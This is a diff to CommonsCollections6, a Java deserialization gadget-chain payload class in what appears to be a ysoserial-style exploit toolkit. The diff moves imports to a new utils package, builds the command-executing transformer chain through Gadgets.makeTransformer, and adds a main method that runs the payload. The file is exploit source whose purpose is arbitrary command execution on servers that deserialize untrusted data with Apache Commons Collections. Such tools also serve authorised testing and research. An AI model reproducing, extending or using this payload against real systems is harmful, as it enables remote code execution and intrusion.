@@ -1,5 +1,7 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
@@ -7,8 +9,7 @@ import org.apache.commons.collections.map.LazyMap;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Reflections;
-import A.R.ysogate.payloads.util.TransformerUtil;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import java.io.Serializable;
 import java.lang.reflect.Field;
@@ -39,7 +40,7 @@ public class CommonsCollections6 implements ObjectPayload<Serializable> {
 
 	public Serializable getObject(final String command) throws Exception {
 
-		final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+		final Transformer[] transformers = Gadgets.makeTransformer(command);
 
 		Transformer transformerChain = new ChainedTransformer(transformers);
 
@@ -85,5 +86,9 @@ public class CommonsCollections6 implements ObjectPayload<Serializable> {
 
 		return map;
 
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollections6.class, args);
 	}
 }
